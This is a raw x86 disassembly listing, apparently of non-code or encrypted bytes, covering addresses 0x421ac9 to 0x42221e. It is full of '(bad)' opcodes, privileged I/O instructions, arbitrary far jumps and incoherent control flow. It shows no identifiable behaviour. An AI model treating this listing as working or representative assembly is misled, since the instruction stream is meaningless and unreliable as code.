  421ac9:	aam    0x42
  421acb:	push   esi
  421acc:	in     eax,0xb4
  421ace:	or     eax,0xf0574bd2
  421ad3:	xchg   DWORD PTR [ebp+edi*1-0x7c],ebx
  421ad7:	push   ss
  421ad8:	das    
  421ad9:	sub    al,0x59
  421adb:	mov    ebp,0xf0f2ec68
  421ae0:	push   edi
  421ae1:	outs   dx,DWORD PTR ds:[esi]
  421ae2:	pop    esi
  421ae3:	push   cs
  421ae4:	cmc    
  421ae5:	jl     0x421aba
  421ae7:	sub    esp,ebx
  421ae9:	lock sbb BYTE PTR [edi+ebx*8+0x53],al
  421aee:	ret    
  421aef:	outs   dx,BYTE PTR ds:[esi]
  421af0:	aas    
  421af1:	jl     0x421b5f
  421af3:	mov    ah,0x3e
  421af5:	aad    0xde
  421af7:	loop   0x421b41
  421af9:	pop    es
  421afa:	hlt    
  421afb:	sti    
  421afc:	xchg   ecx,eax
  421afd:	push   edx
  421afe:	es jb  0x421b50
  421b01:	push   cs
  421b02:	fwait
  421b03:	mov    ebx,0xd4c28387
  421b08:	aam    0x45
  421b0a:	and    DWORD PTR [esi+0x723fb978],ecx
  421b10:	jmp    DWORD PTR [ebp-0x12]
  421b13:	pop    esi
  421b14:	ds arpl si,dx
  421b17:	dec    ecx
  421b18:	ret    
  421b19:	arpl   WORD PTR [ecx-0x6b],di
  421b1c:	jl     0x421b77
  421b1e:	mov    WORD PTR [esi-0xc],cs
  421b21:	retf   0x7c93
  421b24:	xor    ebp,DWORD PTR [eax+esi*4]
  421b27:	mov    WORD PTR [eax-0x8e0e306],ds
  421b2d:	mov    dh,bl
  421b2f:	imul   ecx,DWORD PTR [edx+0x5320ff0d],0xffffffd9
  421b36:	shr    BYTE PTR [edi+0x396017fb],0x91
  421b3d:	pop    ebx
  421b3e:	xchg   edx,eax
  421b3f:	outs   dx,BYTE PTR ds:[esi]
  421b40:	xor    al,0xa0
  421b42:	leave  
  421b43:	mov    bl,0x45
  421b45:	shr    BYTE PTR [edx],0x50
  421b48:	lahf   
  421b49:	add    al,0x6f
  421b4b:	in     al,0x51
  421b4d:	ret    0xefc7
  421b50:	ror    DWORD PTR [ecx+0x4703b7b9],cl
  421b56:	pushf  
  421b57:	xchg   dl,dl
  421b59:	push   ds
  421b5a:	sub    bh,BYTE PTR [ebp-0x19688582]
  421b60:	dec    ebp
  421b61:	jb     0x421b02
  421b63:	mov    cl,0x87
  421b65:	std    
  421b66:	jp     0x421b00
  421b68:	jo     0x421aec
  421b6a:	test   eax,0xd5d917aa
  421b6f:	in     al,0x9a
  421b71:	fst    QWORD PTR [ecx]
  421b73:	jmp    0x6118:0xd519ac55
  421b7a:	cmp    BYTE PTR [ebp+0x6],bl
  421b7d:	fst    DWORD PTR [edx-0x50]
  421b80:	sub    dh,0xdb
  421b83:	dec    edx
  421b84:	gs icebp 
  421b86:	rol    BYTE PTR [esp+ecx*4],cl
  421b89:	pop    ebx
  421b8a:	into   
  421b8b:	dec    esi
  421b8c:	push   ds
  421b8d:	daa    
  421b8e:	xlat   BYTE PTR ds:[ebx]
  421b8f:	addr16 pop ebx
  421b91:	pop    es
  421b92:	int3   
  421b93:	jb     0x421b82
  421b95:	sub    eax,0xbe47fcc0
  421b9a:	dec    ebx
  421b9b:	sub    ebx,DWORD PTR [eax]
  421b9d:	popf   
  421b9e:	inc    ecx
  421b9f:	xchg   esp,eax
  421ba0:	xor    al,0xe9
  421ba2:	(bad)  
  421ba3:	jle    0x421bbd
  421ba5:	mov    esp,0x13d6c0cc
  421baa:	rcr    DWORD PTR [esi],cl
  421bac:	(bad)  
  421bad:	fdiv   DWORD PTR [ebp+0xcb20c08]
  421bb3:	pop    ss
  421bb4:	in     al,dx
  421bb5:	mov    bh,0x1f
  421bb7:	pop    edx
  421bb8:	daa    
  421bb9:	push   edx
  421bba:	and    al,0xeb
  421bbc:	push   ecx
  421bbd:	or     DWORD PTR [edi+0x29],esi
  421bc0:	push   edi
  421bc1:	pop    ss
  421bc2:	hlt    
  421bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bc4:	mov    ecx,0xa5eff3e7
  421bc9:	icebp  
  421bca:	nop
  421bcb:	mov    ah,0xff
  421bcd:	and    cl,ah
  421bcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bd0:	cmp    cl,ch
  421bd2:	dec    esp
  421bd3:	imul   edi,DWORD PTR [esi+edx*8],0xffffffb0
  421bd7:	mov    al,0x4
  421bd9:	push   ebp
  421bda:	out    0xa4,eax
  421bdc:	jge    0x421b84
  421bde:	imul   edx,DWORD PTR [ecx],0x678e28ea
  421be4:	cmp    DWORD PTR [ebp+edx*4-0x3e],ecx
  421be8:	dec    ebp
  421be9:	imul   esi,ecx,0xffffffcf
  421bec:	jno    0x421c49
  421bee:	xor    al,0x5d
  421bf0:	sub    al,0xf2
  421bf2:	mov    DWORD PTR [edx-0x54],ebx
  421bf5:	mov    esp,0x2148d484
  421bfa:	xor    eax,0xcc35bac3
  421bff:	stos   BYTE PTR es:[edi],al
  421c00:	pop    ecx
  421c01:	ja     0x421c40
  421c03:	cwde   
  421c04:	xchg   esi,eax
  421c05:	shl    dh,1
  421c07:	fs das 
  421c09:	stos   DWORD PTR es:[edi],eax
  421c0a:	mov    dl,0xc7
  421c0c:	in     al,0xf6
  421c0e:	mov    edx,DWORD PTR [ebx]
  421c10:	cmp    DWORD PTR [ecx+0x2d],edx
  421c13:	leave  
  421c14:	stc    
  421c15:	out    dx,al
  421c16:	popf   
  421c17:	sbb    ecx,DWORD PTR [edi]
  421c19:	inc    ebp
  421c1a:	or     al,0x30
  421c1c:	int3   
  421c1d:	jne    0x421c38
  421c1f:	ret    
  421c20:	in     al,dx
  421c21:	clc    
  421c22:	cld    
  421c23:	jo     0x421c3d
  421c25:	pop    es
  421c26:	fidivr WORD PTR [edx]
  421c28:	cmc    
  421c29:	push   edx
  421c2a:	ss push es
  421c2c:	sub    ebp,DWORD PTR [edx+0x270fb25d]
  421c32:	push   0x5ee5ef79
  421c37:	lods   ax,WORD PTR ds:[esi]
  421c39:	ds ss adc esp,DWORD PTR ds:0x98a923cd
  421c42:	add    bh,BYTE PTR [ecx+0x3a139b5b]
  421c48:	je     0x421c21
  421c4a:	push   eax
  421c4b:	shr    BYTE PTR ds:0xf5436256,cl
  421c51:	xchg   BYTE PTR [edx+0x5],dh
  421c54:	dec    esp
  421c55:	cmp    dl,dl
  421c57:	xor    ecx,DWORD PTR [eax]
  421c59:	xchg   esi,eax
  421c5a:	sub    ebp,edi
  421c5c:	push   es
  421c5d:	sub    dl,dl
  421c5f:	dec    ecx
  421c60:	(bad)  
  421c61:	fdivr  QWORD PTR [eax-0x58]
  421c64:	or     eax,0x30933eed
  421c69:	leave  
  421c6a:	push   edi
  421c6b:	cmp    eax,0xadcfd5ab
  421c70:	scas   eax,DWORD PTR es:[edi]
  421c71:	xchg   ebp,eax
  421c72:	sbb    al,0xc3
  421c74:	push   0x6f5137cb
  421c79:	and    al,0x2e
  421c7b:	sbb    al,BYTE PTR [ecx]
  421c7d:	imul   esi,DWORD PTR [edi],0xb4ff7982
  421c83:	hlt    
  421c84:	dec    edi
  421c85:	sub    cl,al
  421c87:	push   ebx
  421c88:	sbb    ebx,0x93cf630f
  421c8e:	push   ds
  421c8f:	aad    0x3a
  421c91:	pop    esi
  421c92:	loopne 0x421cb6
  421c94:	fbstp  TBYTE PTR [ebp+0xc]
  421c97:	xchg   esi,eax
  421c98:	sbb    DWORD PTR [ecx],0x4cc5534
  421c9e:	inc    ecx
  421c9f:	pop    ds
  421ca0:	pusha  
  421ca1:	rol    DWORD PTR [edx-0x2f966e53],0x65
  421ca8:	or     ebp,DWORD PTR [edx+0x44]
  421cab:	and    eax,0x254d194e
  421cb0:	adc    al,0x55
  421cb2:	jne    0x7aae3aae
  421cb8:	fwait
  421cb9:	mov    ch,0x40
  421cbb:	sub    BYTE PTR [edx+ecx*2],dh
  421cbe:	adc    ecx,DWORD PTR [esi-0xb]
  421cc1:	daa    
  421cc2:	psllq  mm6,mm7
  421cc5:	aas    
  421cc6:	jmp    0x250c:0x691aaea
  421ccd:	inc    ebx
  421cce:	dec    esp
  421ccf:	(bad)  
  421cd0:	mov    eax,0x22d5d120
  421cd5:	xor    DWORD PTR [ecx+0x5c],0xffffff88
  421cd9:	pop    edx
  421cda:	inc    ecx
  421cdb:	push   0xffffffaa
  421cdd:	fsubp  st(4),st
  421cdf:	popf   
  421ce0:	pop    edx
  421ce1:	loope  0x421cb4
  421ce3:	sub    ebx,DWORD PTR [esi+0x4e]
  421ce6:	inc    edx
  421ce7:	mov    ebp,0x504f13a3
  421cec:	pop    edi
  421ced:	jmp    0xf678219c
  421cf2:	outs   dx,DWORD PTR ds:[esi]
  421cf3:	nop
  421cf4:	push   esi
  421cf5:	shl    DWORD PTR [esi-0x70],0xa8
  421cf9:	push   ss
  421cfa:	push   ebp
  421cfb:	pop    ecx
  421cfc:	jg     0x421d58
  421cfe:	mov    bh,0xb9
  421d00:	and    al,bh
  421d02:	jmp    0x4fbc:0xf1d21e02
  421d09:	sbb    DWORD PTR [edx+0x4a],edi
  421d0c:	pusha  
  421d0d:	rol    BYTE PTR [ebp+0x6f],cl
  421d10:	int    0xaf
  421d12:	pop    esp
  421d13:	push   edx
  421d14:	mov    ds:0xd27d9a90,al
  421d19:	enter  0xc452,0xad
  421d1d:	xor    eax,eax
  421d1f:	sub    esi,esi
  421d21:	jae    0x421cd0
  421d23:	or     BYTE PTR ds:0xb926019a,cl
  421d29:	in     eax,dx
  421d2a:	push   eax
  421d2b:	mov    cl,0x3e
  421d2d:	dec    edi
  421d2e:	adc    BYTE PTR [esi],ch
  421d30:	loope  0x421cbd
  421d32:	push   eax
  421d33:	in     al,dx
  421d34:	jmp    0x421d04
  421d36:	std    
  421d37:	xchg   ebp,eax
  421d38:	pop    ecx
  421d39:	into   
  421d3a:	mov    dh,0x7f
  421d3c:	push   edi
  421d3d:	push   edx
  421d3e:	xchg   ebp,eax
  421d3f:	pushf  
  421d40:	fucom  st(6)
  421d42:	xchg   ecx,eax
  421d43:	and    DWORD PTR [edx+0xf],0x28364309
  421d4a:	xchg   DWORD PTR [ecx-0x46],ecx
  421d4d:	fs fcmovnbe st,st(6)
  421d50:	fcmovnb st,st(3)
  421d52:	cmp    BYTE PTR [esi+0x662b1da],ah
  421d58:	push   eax
  421d59:	mov    edi,0x497971a0
  421d5e:	(bad)  
  421d5f:	stos   BYTE PTR es:[edi],al
  421d60:	cwde   
  421d61:	bound  edx,QWORD PTR [eax+0x75]
  421d64:	out    dx,al
  421d65:	dec    esp
  421d66:	mov    bh,BYTE PTR [edx]
  421d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d69:	jmp    0x421d7d
  421d6b:	sahf   
  421d6c:	jle    0x421ddb
  421d6e:	cwde   
  421d6f:	mov    dh,0x76
  421d71:	sbb    esi,DWORD PTR [esi]
  421d73:	int3   
  421d74:	jns    0x421d27
  421d76:	mov    esi,0x6639439b
  421d7b:	test   DWORD PTR [bp+di+0x449],0x280158d8
  421d84:	cld    
  421d85:	xchg   edx,ebx
  421d87:	fs mov al,0x51
  421d8a:	out    dx,al
  421d8b:	add    cl,ah
  421d8d:	call   0x8fd3:0xf9f48047
  421d94:	dec    edi
  421d95:	inc    ebp
  421d96:	jb     0x421d22
  421d98:	adc    BYTE PTR [ebx+ebx*4+0x57],dl
  421d9c:	cs inc esi
  421d9e:	mov    bh,0xb8
  421da0:	fcomip st,st(4)
  421da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421da3:	xchg   esi,eax
  421da4:	outs   dx,DWORD PTR ds:[esi]
  421da5:	sbb    BYTE PTR [ecx-0x7a32b60f],bl
  421dab:	stos   DWORD PTR es:[edi],eax
  421dac:	pop    ecx
  421dad:	inc    eax
  421dae:	adc    eax,0xb7e364cf
  421db3:	out    0x79,al
  421db5:	sub    DWORD PTR [edx-0x3d],ebp
  421db8:	mov    eax,ds:0x5beca0ed
  421dbd:	cmp    al,0x83
  421dbf:	cmp    DWORD PTR [edi+0x47],edx
  421dc2:	push   0xb088558
  421dc7:	cmp    edx,DWORD PTR [ebp-0x40]
  421dca:	cwde   
  421dcb:	dec    esi
  421dcc:	cmc    
  421dcd:	jg     0x421d83
  421dcf:	sbb    cl,BYTE PTR [ebx+0xef31efa]
  421dd5:	pop    ds
  421dd6:	xchg   esp,eax
  421dd7:	shl    ecx,0x71
  421dda:	sbb    al,0xeb
  421ddc:	(bad)  
  421ddd:	aas    
  421dde:	inc    edx
  421ddf:	cli    
  421de0:	push   ss
  421de1:	cwde   
  421de2:	inc    esp
  421de3:	push   0xffffffa1
  421de5:	or     ecx,DWORD PTR [edi+0x2f]
  421de8:	mov    ds:0x6d4a7c49,al
  421ded:	xor    DWORD PTR [edx*4-0x44aad233],ebp
  421df4:	clc    
  421df5:	mov    esi,0x4ac20
  421dfa:	adc    DWORD PTR [edx+0x22],edx
  421dfd:	ds into 
  421dff:	inc    esi
  421e00:	xchg   ebp,eax
  421e01:	pusha  
  421e02:	popa   
  421e03:	sti    
  421e04:	mov    ah,0xe2
  421e06:	in     eax,0xf7
  421e08:	out    dx,eax
  421e09:	push   es
  421e0a:	inc    ecx
  421e0b:	dec    ebp
  421e0c:	inc    ecx
  421e0d:	jg     0x421e0b
  421e0f:	fwait
  421e10:	dec    eax
  421e11:	mov    ss,ebx
  421e13:	jge    0x421e85
  421e15:	sbb    DWORD PTR [esi+ecx*2+0x6e47b128],ecx
  421e1c:	(bad)  
  421e1d:	aad    0xd3
  421e1f:	jp     0x421de1
  421e21:	ds sahf 
  421e23:	repz sub eax,0xac14edf3
  421e29:	sbb    eax,esi
  421e2b:	pop    edi
  421e2c:	sbb    dh,dl
  421e2e:	lods   eax,DWORD PTR ds:[esi]
  421e2f:	inc    ecx
  421e30:	xor    eax,0xa96444d8
  421e35:	push   ecx
  421e36:	adc    edi,DWORD PTR [eax+0x6637d9a]
  421e3c:	mov    dl,0x3
  421e3e:	call   0x9391:0xdbffb4e3
  421e45:	nop
  421e46:	xchg   ebx,eax
  421e47:	xchg   ebp,eax
  421e48:	cmp    edi,ebp
  421e4a:	inc    edx
  421e4b:	in     eax,dx
  421e4c:	in     al,dx
  421e4d:	inc    edx
  421e4e:	stos   DWORD PTR es:[edi],eax
  421e4f:	inc    ebx
  421e50:	mov    edi,0x7f66f88c
  421e55:	dec    ebp
  421e56:	add    bh,al
  421e58:	mov    esp,0x8b8d1e05
  421e5d:	adc    esi,DWORD PTR [ebp+0x6b89264f]
  421e63:	add    ch,BYTE PTR ds:0x8416eb3
  421e69:	clc    
  421e6a:	shl    BYTE PTR [edi+0x51],1
  421e6d:	(bad)  
  421e6e:	rsm    
  421e70:	shr    DWORD PTR [ecx],1
  421e72:	xor    al,0x9a
  421e74:	(bad)  
  421e75:	inc    esi
  421e77:	mov    edx,0xb743701
  421e7c:	inc    eax
  421e7d:	inc    eax
  421e7e:	es xchg ebx,eax
  421e80:	cs icebp 
  421e82:	xor    DWORD PTR [edx],edi
  421e84:	fs (bad) 
  421e86:	popa   
  421e87:	js     0x421e2c
  421e89:	cmp    bl,bl
  421e8b:	xor    al,0x8a
  421e8d:	xlat   BYTE PTR ds:[ebx]
  421e8e:	hlt    
  421e8f:	in     eax,0xca
  421e91:	shl    BYTE PTR ds:0x414de436,1
  421e97:	inc    eax
  421e98:	xchg   ecx,eax
  421e99:	mov    ds:0xfeed0107,eax
  421e9e:	fadd   QWORD PTR [esi]
  421ea0:	jle    0x421f19
  421ea2:	aas    
  421ea3:	xor    eax,0xf4f641fe
  421ea8:	pop    edi
  421ea9:	sub    BYTE PTR [esi-0x596e2939],dh
  421eaf:	mov    esi,0xec47736c
  421eb4:	(bad)  
  421eb6:	push   eax
  421eb7:	lahf   
  421eb8:	aaa    
  421eb9:	div    DWORD PTR [ecx+0x38ac0b86]
  421ebf:	inc    ecx
  421ec0:	inc    edx
  421ec1:	and    BYTE PTR [ecx+ebx*1],bl
  421ec4:	xchg   esp,eax
  421ec5:	and    eax,0x166be085
  421eca:	and    eax,0xca856087
  421ecf:	rcl    ah,1
  421ed1:	push   ecx
  421ed2:	data16 out 0x50,al
  421ed5:	outs   dx,DWORD PTR ds:[esi]
  421ed6:	dec    edx
  421ed7:	push   esp
  421ed8:	bound  eax,QWORD PTR [eax]
  421eda:	out    dx,al
  421edb:	retf   0x16d5
  421ede:	popa   
  421edf:	and    eax,0xc8f1360e
  421ee4:	mov    edx,0xb00e7e31
  421ee9:	lock (bad) 
  421eeb:	xchg   edx,eax
  421eec:	ret    0x411a
  421eef:	sahf   
  421ef0:	xlat   BYTE PTR ds:[ebx]
  421ef1:	mov    WORD PTR [edi+0x2a],es
  421ef4:	xlat   BYTE PTR ds:[ebx]
  421ef5:	sbb    dh,BYTE PTR [edx+esi*2-0x7a]
  421ef9:	jnp    0x421eba
  421efb:	mov    DWORD PTR [edx*4+0x63d9901b],edx
  421f02:	test   al,0x8d
  421f04:	pop    esp
  421f05:	sub    esi,0x751df3c
  421f0b:	jmp    0x421f85
  421f0d:	or     eax,ebx
  421f0f:	ds dec edx
  421f11:	retf   
  421f12:	inc    ebx
  421f13:	jae    0x421f76
  421f15:	dec    ebx
  421f16:	xchg   esp,eax
  421f17:	and    bl,BYTE PTR [edx]
  421f19:	add    ch,0xe7
  421f1c:	xlat   BYTE PTR ds:[ebx]
  421f1d:	ss mov eax,0x8150f4a2
  421f23:	jl     0x421f7c
  421f25:	sbb    eax,0x975f9e39
  421f2a:	inc    esp
  421f2b:	bound  ecx,QWORD PTR [esp+ebp*2-0x1b]
  421f2f:	push   es
  421f30:	and    eax,esi
  421f32:	mov    ebx,0xa6597379
  421f37:	jg     0x421fb7
  421f39:	pop    ebp
  421f3a:	das    
  421f3b:	bound  eax,QWORD PTR [ebx+ecx*2-0x16a68bf0]
  421f42:	aaa    
  421f43:	lock lahf 
  421f45:	fucomi st,st(0)
  421f47:	or     ebx,DWORD PTR [esi-0x43]
  421f4a:	fisub  WORD PTR [ebx]
  421f4c:	sbb    bh,cl
  421f4e:	imul   edi,edx,0x3c3ce70c
  421f54:	mov    al,0xb9
  421f56:	(bad)  
  421f57:	or     al,0xe3
  421f59:	and    edi,DWORD PTR [ecx-0x59]
  421f5c:	shl    cl,cl
  421f5e:	sub    edx,DWORD PTR [ecx-0x26]
  421f61:	lods   al,BYTE PTR gs:[esi]
  421f63:	push   ecx
  421f64:	(bad)  
  421f65:	jmp    0x1594:0xe7c56f2f
  421f6c:	sbb    al,0xdb
  421f6e:	out    dx,al
  421f6f:	in     eax,0x13
  421f71:	es push cs
  421f73:	mov    cl,0x47
  421f75:	inc    esp
  421f76:	scas   eax,DWORD PTR es:[edi]
  421f77:	outs   dx,BYTE PTR ds:[esi]
  421f78:	adc    edi,ecx
  421f7a:	dec    eax
  421f7b:	ja     0x421f55
  421f7d:	xlat   BYTE PTR ds:[ebx]
  421f7e:	xchg   edx,eax
  421f7f:	inc    ebp
  421f80:	xchg   edx,eax
  421f81:	lahf   
  421f82:	in     eax,dx
  421f83:	int    0x21
  421f85:	mov    esp,0x7ec35f8d
  421f8a:	(bad)  
  421f8b:	ins    DWORD PTR es:[edi],dx
  421f8c:	adc    BYTE PTR [ebx+0x22d1eb16],ch
  421f92:	scas   eax,DWORD PTR es:[edi]
  421f93:	xor    ch,dl
  421f95:	ins    BYTE PTR es:[edi],dx
  421f96:	nop
  421f97:	jg     0x421fef
  421f99:	xchg   esi,eax
  421f9a:	xor    eax,0x5f5d363b
  421f9f:	jae    0x42201c
  421fa1:	nop
  421fa2:	pop    edx
  421fa3:	repnz jecxz 0x421feb
  421fa6:	arpl   WORD PTR [eax-0xa55eed2],dx
  421fac:	inc    ebp
  421fad:	in     eax,0x34
  421faf:	or     ch,BYTE PTR [ecx]
  421fb1:	in     eax,0x49
  421fb3:	cmp    al,cl
  421fb5:	xor    ecx,ebp
  421fb7:	jg     0x421f4f
  421fb9:	cmc    
  421fba:	sbb    edx,DWORD PTR [esi-0x51af6d]
  421fc0:	jl     0x421fe0
  421fc2:	pushf  
  421fc3:	pop    ecx
  421fc4:	mov    DWORD PTR [ebp+0x756efba3],ebp
  421fca:	cli    
  421fcb:	inc    ebx
  421fcc:	in     eax,dx
  421fcd:	(bad)  
  421fce:	xor    al,0x7
  421fd0:	into   
  421fd1:	lds    edi,FWORD PTR [eax+0x1fc94d25]
  421fd7:	pop    edi
  421fd8:	xchg   BYTE PTR [ebx-0x3d134f3a],bh
  421fde:	retf   0xb313
  421fe1:	sub    DWORD PTR [esi-0x75dab4af],eax
  421fe7:	jnp    0x42202a
  421fe9:	sub    al,0xdd
  421feb:	add    BYTE PTR [esi],dl
  421fed:	push   0x491976da
  421ff2:	es mov ch,0xa6
  421ff5:	gs inc ebp
  421ff7:	aad    0x99
  421ff9:	arpl   bp,di
  421ffb:	hlt    
  421ffc:	lods   eax,DWORD PTR ds:[esi]
  421ffd:	dec    esp
  421ffe:	aad    0x3b
  422000:	arpl   WORD PTR [edx],bx
  422002:	pushf  
  422003:	mov    ?,WORD PTR [ecx-0x5ddf62fa]
  422009:	mov    al,0x9e
  42200b:	fdiv   QWORD PTR [edi]
  42200d:	adc    BYTE PTR [ebx-0x46],cl
  422010:	aas    
  422011:	inc    edi
  422012:	into   
  422013:	mov    BYTE PTR [esi+0x2c65efd3],bl
  422019:	and    eax,0xfb364051
  42201e:	and    cl,dl
  422020:	out    0x92,eax
  422022:	sub    eax,0x4187eacf
  422027:	inc    edi
  422028:	(bad)  
  422029:	repz pop es
  42202b:	jns    0x421fe7
  42202d:	in     al,0xa
  42202f:	pop    ds
  422030:	jo     0x422070
  422032:	xor    WORD PTR [edi],cx
  422035:	cdq    
  422036:	(bad)  
  422037:	outs   dx,WORD PTR ds:[esi]
  422039:	mov    edi,DWORD PTR [eax]
  42203b:	xor    eax,0x20fd9319
  422040:	mov    ebp,0x99f88d50
  422045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422046:	inc    DWORD PTR [ebp+0x68]
  422049:	push   0x33
  42204b:	iret   
  42204c:	cmp    DWORD PTR [edx-0x3358f88f],eax
  422052:	cmp    al,0x63
  422054:	(bad)  
  422055:	sti    
  422056:	or     DWORD PTR [edi+0x682ee151],ecx
  42205c:	daa    
  42205d:	cmp    eax,0x866ef2a6
  422062:	fistp  DWORD PTR [eax]
  422064:	test   eax,0x2db69b4d
  422069:	mov    ch,0x3f
  42206b:	(bad)
  42206e:	iret   
  42206f:	in     al,dx
  422070:	push   ebp
  422071:	mov    ch,BYTE PTR [esi+0x3f33cb42]
  422077:	ins    BYTE PTR es:[edi],dx
  422078:	sti    
  422079:	loope  0x422087
  42207b:	add    esi,DWORD PTR [ecx]
  42207d:	pop    es
  42207e:	int    0xc1
  422080:	pop    ss
  422081:	je     0x422042
  422083:	sbb    DWORD PTR [edi],ebx
  422085:	das    
  422086:	xor    ebp,esp
  422088:	sti    
  422089:	jo     0x4220e6
  42208b:	ins    BYTE PTR es:[edi],dx
  42208c:	jbe    0x422062
  42208e:	leave  
  42208f:	pop    ebx
  422090:	mov    esi,0x930eb3a1
  422095:	xchg   esp,esp
  422097:	test   DWORD PTR [edx+0x216478f9],0x8eda1842
  4220a1:	lock rol DWORD PTR [esi],cl
  4220a4:	adc    eax,0x92b9238e
  4220a9:	seta   BYTE PTR [ecx-0x7e039f9e]
  4220b0:	mov    DWORD PTR [eax],edi
  4220b2:	sbb    DWORD PTR [ecx-0x44bce8e7],esp
  4220b8:	pop    ds
  4220b9:	mov    bh,0xd5
  4220bb:	dec    ebp
  4220bc:	daa    
  4220bd:	stos   BYTE PTR es:[edi],al
  4220be:	xchg   esi,eax
  4220bf:	pusha  
  4220c0:	sub    DWORD PTR [edx-0x1f3f4c91],eax
  4220c6:	sub    ch,ah
  4220c8:	xchg   ecx,eax
  4220c9:	mov    cl,0x8a
  4220cb:	popa   
  4220cc:	or     al,0xd9
  4220ce:	inc    DWORD PTR ds:0x9cf447eb
  4220d4:	lea    ebx,[esi]
  4220d6:	pushf  
  4220d7:	sbb    ah,BYTE PTR [esi]
  4220d9:	ins    BYTE PTR es:[edi],dx
  4220da:	cmp    DWORD PTR [esi+eax*8],edi
  4220dd:	stos   BYTE PTR es:[edi],al
  4220de:	jno    0x4220eb
  4220e0:	enter  0xbf6a,0x67
  4220e4:	mov    sp,0x8c24
  4220e8:	fcom   QWORD PTR [ebp+0x7da28fb]
  4220ee:	mov    esi,0x2b5655e8
  4220f3:	retf   0x64dc
  4220f6:	div    ebx
  4220f8:	in     al,0x83
  4220fa:	iret   
  4220fb:	jecxz  0x422141
  4220fd:	mov    ah,0xe0
  4220ff:	hlt    
  422100:	repz loopne 0x4220f8
  422103:	pop    es
  422104:	xor    al,0x54
  422106:	pop    esi
  422107:	adc    ebp,DWORD PTR [edi+eiz*2-0x4b]
  42210b:	sbb    DWORD PTR [ecx],eax
  42210d:	dec    esp
  42210e:	scas   eax,DWORD PTR es:[edi]
  42210f:	es (bad) 
  422111:	arpl   WORD PTR [esi-0x3a18e410],ax
  422117:	cmp    BYTE PTR ds:0x1fa93df3,ch
  42211d:	int3   
  42211e:	pop    edx
  42211f:	mov    esp,0xe292eebb
  422124:	sahf   
  422125:	mov    dl,0xc8
  422127:	popf   
  422128:	lods   al,BYTE PTR ds:[esi]
  422129:	xchg   esi,eax
  42212a:	inc    edi
  42212b:	aas    
  42212c:	jne    0x422165
  42212e:	imul   ebx,DWORD PTR [ebx+0x57],0xffffffe4
  422132:	test   DWORD PTR [eax-0x72],esp
  422135:	sub    ah,BYTE PTR ds:0x380fb048
  42213b:	enter  0xb51f,0xf
  42213f:	inc    edi
  422140:	test   al,0xf8
  422142:	add    DWORD PTR cs:[edx+0x1dfe4dd9],edx
  422149:	scas   eax,DWORD PTR es:[edi]
  42214a:	lods   al,BYTE PTR ds:[esi]
  42214b:	xchg   edx,eax
  42214c:	mov    esi,ds
  42214e:	mov    edx,0x8907dcc6
  422153:	sub    ch,BYTE PTR [edi]
  422155:	popf   
  422156:	in     al,0xeb
  422158:	and    cl,dh
  42215a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42215b:	jl     0x422141
  42215d:	or     ch,ch
  42215f:	or     al,0x1d
  422161:	fnstcw WORD PTR [esi+0x24]
  422164:	mov    bh,0x80
  422166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422167:	sub    DWORD PTR [edx-0x5f],ecx
  42216a:	jns    0x4221a3
  42216c:	enter  0x7786,0xc2
  422170:	mov    eax,ds:0x2de4de4d
  422175:	inc    esp
  422176:	push   edx
  422177:	(bad)  
  422178:	scas   eax,DWORD PTR es:[edi]
  422179:	into   
  42217a:	(bad)  
  42217b:	jp     0x42211c
  42217d:	add    al,0xea
  42217f:	in     al,dx
  422180:	cdq    
  422181:	mov    ebp,0xed0ea001
  422186:	xchg   ebp,eax
  422187:	sbb    eax,0x70a45a2a
  42218c:	jns    0x422171
  42218e:	adc    ebx,ebx
  422190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422191:	cdq    
  422192:	loopne 0x422140
  422194:	lock fdivr DWORD PTR [edx-0x13]
  422198:	ret    
  422199:	xor    ecx,ebx
  42219b:	jg     0x422196
  42219d:	push   eax
  42219e:	and    bl,BYTE PTR [ebx+0x1fb1aef4]
  4221a4:	ins    DWORD PTR es:[edi],dx
  4221a5:	lods   al,BYTE PTR ds:[esi]
  4221a6:	(bad)  
  4221a7:	out    dx,al
  4221a8:	or     WORD PTR [ebx+eiz*1+0x69c7d8a1],sp
  4221b0:	sahf   
  4221b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221b2:	pop    edi
  4221b3:	aas    
  4221b4:	pop    eax
  4221b5:	int    0x78
  4221b7:	rcl    BYTE PTR ss:[eax],0x75
  4221bb:	pop    ebp
  4221bc:	hlt    
  4221bd:	mov    edi,0xc62f3157
  4221c2:	nop
  4221c3:	pop    es
  4221c4:	mov    dl,0x5a
  4221c7:	xor    DWORD PTR [edi+0x3b],esi
  4221ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221cb:	pop    esp
  4221cc:	mov    ds,WORD PTR [eax+eiz*1]
  4221cf:	xchg   esi,eax
  4221d0:	pusha  
  4221d1:	jae    0x4221e6
  4221d3:	pop    edi
  4221d4:	or     edx,ecx
  4221d6:	and    eax,0x9880e31a
  4221db:	push   ecx
  4221dc:	and    bh,BYTE PTR [ebx+0x113e8cb4]
  4221e2:	das    
  4221e3:	scas   eax,DWORD PTR es:[edi]
  4221e4:	ret    0x8c08
  4221e7:	int    0xba
  4221e9:	dec    ecx
  4221ea:	and    al,0x1a
  4221ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221ed:	jle    0x42218d
  4221ef:	and    ebx,DWORD PTR ss:[edi+0x34]
  4221f3:	(bad)  
  4221f4:	and    BYTE PTR [ecx],ah
  4221f6:	into   
  4221f7:	inc    ebx
  4221f8:	cmp    dl,BYTE PTR [ecx-0x31122a58]
  4221fe:	sbb    edx,esi
  422200:	jp     0x42219e
  422202:	and    ebp,edi
  422204:	xor    DWORD PTR [eax+edi*1],ebp
  422207:	nop
  422208:	xchg   BYTE PTR [ecx],bh
  42220a:	cmc    
  42220b:	push   ss
  42220c:	jo     0x42223a
  42220e:	and    dh,dl
  422210:	add    ebx,0xffffff88
  422213:	retf   0x7b12
  422216:	fwait
  422217:	push   edi
  422218:	leave  
  422219:	cmp    ebp,edi
  42221b:	mov    dl,0x7b
  42221d:	dec    edi
  42221e:	fnstsw WORD PTR [esi+0x6c]
